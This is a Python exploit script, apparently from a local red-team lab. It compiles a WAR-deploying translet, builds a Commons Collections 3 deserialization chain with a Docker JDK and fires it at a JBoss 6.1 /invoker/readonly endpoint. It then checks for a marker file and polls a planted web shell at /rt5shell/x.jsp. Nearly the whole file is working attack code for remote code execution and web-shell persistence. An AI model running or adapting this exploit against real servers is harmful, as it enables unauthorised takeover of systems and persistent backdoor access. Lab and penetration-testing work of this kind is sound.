# -*- coding: utf-8 -*-
"""RT5 JBoss Attack B: compile PwnJBoss (WAR-deploying translet), build CC3 chain,
   fire, then poll /rt5shell/x.jsp for persistence evidence."""
import os
import re
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = os.path.abspath(os.path.join(HERE, "..", ".."))
sys.path.insert(0, os.path.join(LAB, "exp"))
from common import session  # noqa: E402

JAVA = os.path.join(HERE, "java")
OUT = os.path.join(HERE, "out")
os.makedirs(OUT, exist_ok=True)

# 1) inject war b64 into PwnJBoss.java
src = open(os.path.join(JAVA, "PwnJBoss.java"), "r").read()
b64 = open(os.path.join(HERE, "war_b64.txt"), "r").read().strip()
src = src.replace("__WAR_B64__", b64)
tmpjava = os.path.join(JAVA, "PwnJBossGen.java")
src = src.replace("public PwnJBoss()", "public PwnJBossGen()")
with open(tmpjava, "w", newline="\n") as f:
    f.write(src.replace("public class PwnJBoss", "public class PwnJBossGen"))
print("[+] java source prepared (%d bytes, war b64 %d)" % (len(src), len(b64)))

# 2) compile in temurin 8 jdk container (-source/-target 7 for JBoss JVM 7u221)
r = subprocess.run([
    "docker", "run", "--rm", "-v", LAB.replace(os.sep, "/") + ":/w", "-w", "/w",
    "eclipse-temurin:8-jdk-alpine", "sh", "-c",
    "javac -source 7 -target 7 -cp /w/exp/rt5/cc32_jboss.jar "
    "-d /w/exp/rt5/out /w/exp/rt5/java/PwnJBossGen.java /w/exp/rt5/java/GenChain6.java 2>&1"
], capture_output=True, text=True)
print(r.stdout[-2000:] + r.stderr[-2000:])
if r.returncode != 0:
    sys.exit("compile failed")

# 3) build the serialized CC3 chain
r = subprocess.run([
    "docker", "run", "--rm", "-v", LAB.replace(os.sep, "/") + ":/w", "-w", "/w/exp/rt5/out",
    "eclipse-temurin:8-jdk-alpine", "sh", "-c",
    "java -cp .:/w/exp/rt5/cc32_jboss.jar GenChain6 /w/exp/rt5/out/rt5_jboss_cc3.ser /w/exp/rt5/out/PwnJBossGen.class 2>&1"
], capture_output=True, text=True)
print(r.stdout[-2000:] + r.stderr[-2000:])
ser = os.path.join(OUT, "rt5_jboss_cc3.ser")
if not os.path.exists(ser) or os.path.getsize(ser) == 0:
    sys.exit("chain build failed")

# 4) fire at readonly
s = session()
data = open(ser, "rb").read()
r = s.post("http://127.0.0.1:18080/invoker/readonly", data=data,
           headers={"Host": "evil.com", "Content-Type": "application/x-www-form-urlencoded"},
           timeout=60)
print("[*] CC3 fired -> HTTP %s (%dB)" % (r.status_code, len(r.content)))

# 5) truth: marker + war file
for p in ["/jboss-6.1.0.Final/rt5_cc3_marker",
          "/jboss-6.1.0.Final/server/default/deploy/rt5shell.war",
          "/tmp/rt5_cc3_tmp"]:
    rr = subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "ls", "-l", "--full-time", p],
                        capture_output=True, text=True)
    print((rr.stdout + rr.stderr).strip())

# 6) poll the deployed shell
url = "http://127.0.0.1:18080/rt5shell/x.jsp"
print("[*] polling %s" % url)
for i in range(12):
    time.sleep(5)
    try:
        resp = s.get(url, timeout=10)
        print("[%02d] HTTP %s len=%d" % (i, resp.status_code, len(resp.content)))
        if resp.status_code == 200:
            print(resp.text[:1200])
            break
    except Exception as e:  # noqa: BLE001
        print("[%02d] %s" % (i, e))
